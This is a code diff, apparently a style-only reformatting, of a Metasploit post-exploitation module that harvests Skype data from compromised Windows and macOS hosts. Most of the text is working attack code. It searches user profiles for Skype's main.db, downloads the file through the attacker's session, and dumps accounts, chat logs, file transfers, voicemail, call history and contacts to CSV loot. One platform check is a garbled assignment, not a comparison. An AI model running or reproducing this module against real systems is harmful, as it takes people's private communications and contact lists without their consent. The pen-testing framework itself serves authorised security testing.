@@ -10,23 +10,27 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::OSX::System
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Multi Gather Skype User Data Enumeration',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather Skype User Data Enumeration',
+        'Description' => %q{
           This module will enumerate Skype account settings, contact list, call history, chat logs,
           file transfer history, and voicemail logs, saving all the data to CSV files for analysis.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-        'Platform'      => %w{ osx win },
-        'SessionTypes'  => [ 'meterpreter', 'shell' ]
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+        'Platform' => %w{osx win},
+        'SessionTypes' => [ 'meterpreter', 'shell' ]
+      )
+    )
     register_advanced_options(
       [
         # Set as an advanced option since it can only be useful in shell sessions.
-        OptInt.new('TIMEOUT', [true ,'Timeout in seconds when downloading main.db on a shell session.', 90]),
-      ])
+        OptInt.new('TIMEOUT', [true, 'Timeout in seconds when downloading main.db on a shell session.', 90]),
+      ]
+    )
   end
 
   # Run Method for when run command is issued
@@ -42,34 +46,34 @@ class MetasploitModule < Msf::Post
       return
     end
 
-      if session.platform =~ /java/
-        # Make sure that Java Meterpreter on anything but OSX will exit
-        if session.platform !~ /osx/
-          print_error("This session type and platform are not supported.")
-          return
-        end
-        # Iterate thru each user profile on as OSX System for users not in the default install
-        users = get_users.collect {|p| if p['uid'].to_i > 500; p; end }.compact
-        users.each do |p|
-          if check_skype("#{p['dir']}/Library/Application Support/", p['name'])
-            db_in_loot = download_db(p)
-            # Exit if file was not successfully downloaded
-            return if db_in_loot.nil?
-            process_db(db_in_loot,p['name'])
-          end
-        end
-      elsif (session.platform =- 'windows' and session.type == 'meterpreter')
-        # Iterate thru each user profile in a Windows System using Meterpreter Post API
-        grab_user_profiles().each do |p|
-          if check_skype(p['AppData'],p['UserName'])
-            db_in_loot = download_db(p)
-            process_db(db_in_loot,p['UserName'])
-          end
-        end
-      else
+    if session.platform =~ /java/
+      # Make sure that Java Meterpreter on anything but OSX will exit
+      if session.platform !~ /osx/
         print_error("This session type and platform are not supported.")
+        return
       end
+      # Iterate thru each user profile on as OSX System for users not in the default install
+      users = get_users.collect { |p| if p['uid'].to_i > 500; p; end }.compact
+      users.each do |p|
+        if check_skype("#{p['dir']}/Library/Application Support/", p['name'])
+          db_in_loot = download_db(p)
+          # Exit if file was not successfully downloaded
+          return if db_in_loot.nil?
 
+          process_db(db_in_loot, p['name'])
+        end
+      end
+    elsif (session.platform = - 'windows' and session.type == 'meterpreter')
+      # Iterate thru each user profile in a Windows System using Meterpreter Post API
+      grab_user_profiles().each do |p|
+        if check_skype(p['AppData'], p['UserName'])
+          db_in_loot = download_db(p)
+          process_db(db_in_loot, p['UserName'])
+        end
+      end
+    else
+      print_error("This session type and platform are not supported.")
+    end
   end
 
   # Check if Skype is installed. Returns true or false.
@@ -96,26 +100,25 @@ class MetasploitModule < Msf::Post
   def download_db(profile)
     if session.type == 'meterpreter'
       if session.platform == 'osx'
-        file = session.fs.file.search("#{profile['dir']}/Library/Application Support/Skype/","main.db",true)
+        file = session.fs.file.search("#{profile['dir']}/Library/Application Support/Skype/", "main.db", true)
       else
-        file = session.fs.file.search("#{profile['AppData']}\\Skype","main.db",true)
+        file = session.fs.file.search("#{profile['AppData']}\\Skype", "main.db", true)
       end
     else
-      file = cmd_exec("mdfind","-onlyin #{profile['dir']} -name main.db").split("\n").collect {|p| if p =~ /Skype\/\w*\/main.db$/; p; end }.compact
+      file = cmd_exec("mdfind", "-onlyin #{profile['dir']} -name main.db").split("\n").collect { |p| if p =~ /Skype\/\w*\/main.db$/; p; end }.compact
     end
 
     file_loc = store_loot("skype.config",
-        "binary/db",
-        session,
-        "main.db",
-        "Skype Configuration database for #{profile['UserName']}"
-      )
+                          "binary/db",
+                          session,
+                          "main.db",
+                          "Skype Configuration database for #{profile['UserName']}")
 
     file.each do |db|
       if session.type == 'meterpreter'
         maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
         print_status("Downloading #{maindb}")
-        session.fs.file.download_file(file_loc,maindb)
+        session.fs.file.download_file(file_loc, maindb)
       else
         print_status("Downloading #{db}")
         # Giving it 1:30 minutes to download since the file could be several MB
@@ -137,15 +140,16 @@ class MetasploitModule < Msf::Post
   end
 
   # Saves rows returned from a query to a given CSV file
-  def save_csv(data,file)
+  def save_csv(data, file)
     CSV.open(file, "w") do |csvwriter|
       data.each do |record|
         csvwriter << record
       end
     end
   end
+
   # Extracts the data from the DB in to a CSV file
-  def process_db(db_path,user)
+  def process_db(db_path, user)
     db = SQLite3::Database.new(db_path)
 
     # Extract information for accounts configured in Skype
@@ -169,14 +173,13 @@ class MetasploitModule < Msf::Post
     # Check if an account exists and if it does enumerate if not exit.
     if user_rows.length > 1
       user_info = store_loot("skype.accounts",
-            "text/plain",
-            session,
-            "",
-            "skype_accounts.csv",
-            "Skype User #{user} Account information from configuration database."
-          )
+                             "text/plain",
+                             session,
+                             "",
+                             "skype_accounts.csv",
+                             "Skype User #{user} Account information from configuration database.")
       print_good("Saving account information to #{user_info}")
-      save_csv(user_rows,user_info)
+      save_csv(user_rows, user_info)
     else
       print_error("No skype accounts are configured for #{user}")
       return
@@ -188,12 +191,11 @@ class MetasploitModule < Msf::Post
           datetime("timestamp","unixepoch"), "body_xml",
           "remote_id" FROM "Messages" WHERE type == 61;')
     chat_log = store_loot("skype.chat",
-            "text/plain",
-            session,
-            "",
-            "skype_chatlog.csv",
-            "Skype User #{user} chat log from configuration database."
-          )
+                          "text/plain",
+                          session,
+                          "",
+                          "skype_chatlog.csv",
+                          "Skype User #{user} chat log from configuration database.")
 
     if cl_rows.length > 1
       print_good("Saving chat log to #{chat_log}")
@@ -210,12 +212,11 @@ class MetasploitModule < Msf::Post
           "convo_id", datetime("accepttime","unixepoch") FROM "Transfers";')
 
     file_transfer = store_loot("skype.filetransfer",
-          "text/csv",
-          session,
-          "",
-          "skype_filetransfer.csv",
-          "Skype User #{user} file transfer history."
-        )
+                               "text/csv",
+                               session,
+                               "",
+                               "skype_filetransfer.csv",
+                               "Skype User #{user} file transfer history.")
     # Check that we have actual file transfers to report
     if ft_rows.length > 1
       print_good("Saving file transfer history to #{file_transfer}")
@@ -232,12 +233,11 @@ class MetasploitModule < Msf::Post
           "size", "path", "xmsg" FROM "Voicemails";')
 
     voicemail = store_loot("skype.voicemail",
-          "text/csv",
-          session,
-          "",
-          "skype_voicemail.csv",
-          "Skype User #{user} voicemail history."
-        )
+                           "text/csv",
+                           session,
+                           "",
+                           "skype_voicemail.csv",
+                           "Skype User #{user} voicemail history.")
 
     if vm_rows.length > 1
       print_good("Saving voicemail history to #{voicemail}")
@@ -255,12 +255,11 @@ class MetasploitModule < Msf::Post
           "premium_video_sponsor_list", "conv_dbid" FROM "Calls";')
 
     call_log = store_loot("skype.callhistory",
-          "text/csv",
-          session,
-          "",
-          "skype_callhistory.csv",
-          "Skype User #{user} call history."
-        )
+                          "text/csv",
+                          session,
+                          "",
+                          "skype_callhistory.csv",
+                          "Skype User #{user} call history.")
     if call_rows.length > 1
       print_good("Saving call log to #{call_log}")
       save_csv(call_rows, call_log)
@@ -282,12 +281,11 @@ class MetasploitModule < Msf::Post
           FROM "Contacts";')
 
     contact_log = store_loot("skype.contactlist",
-          "text/csv",
-          session,
-          "",
-          "skype_contactlist.csv",
-          "Skype User #{user} contact list."
-        )
+                             "text/csv",
+                             session,
+                             "",
+                             "skype_contactlist.csv",
+                             "Skype User #{user} contact list.")
     if ct_rows.length > 1
       print_good("Saving contact list to #{contact_log}")
       save_csv(ct_rows, contact_log)
